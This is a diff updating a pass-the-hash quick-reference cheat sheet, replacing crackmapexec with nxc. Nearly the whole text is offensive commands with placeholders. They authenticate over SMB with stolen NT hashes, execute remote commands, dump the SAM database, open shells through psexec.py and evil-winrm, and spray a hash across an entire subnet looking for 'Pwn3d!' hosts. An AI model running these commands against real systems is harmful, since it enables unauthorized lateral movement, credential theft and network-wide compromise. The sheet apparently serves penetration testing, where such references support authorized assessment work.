@@ -3,11 +3,11 @@ PASS-THE-HASH (PtH) - QUICK REF
 Hash format needed:  <LM>:<NT>   (pass only the NT half after the colon)
 
 SMB access check:
-    crackmapexec smb <target-ip> -u <user> -H <NT-hash>
+    nxc smb <target-ip> -u <user> -H <NT-hash>
 SMB command exec:
-    crackmapexec smb <target-ip> -u <user> -H <NT-hash> -x "<cmd>"
+    nxc smb <target-ip> -u <user> -H <NT-hash> -x "<cmd>"
 SAM dump (needs local admin):
-    crackmapexec smb <target-ip> -u <user> -H <NT-hash> --sam
+    nxc smb <target-ip> -u <user> -H <NT-hash> --sam
 
 Shell via SMB:
     psexec.py   <domain>/<user>@<target-ip> -hashes :<NT-hash>   (drops binary)
@@ -19,5 +19,5 @@ WinRM shell (port 5985):
     evil-winrm -i <target-ip> -u <user> -H <NT-hash>
 
 Spray across subnet:
-    crackmapexec smb <subnet>/<cidr> -u <user> -H <NT-hash> --local-auth
+    nxc smb <subnet>/<cidr> -u <user> -H <NT-hash> --local-auth
     → look for (Pwn3d!)
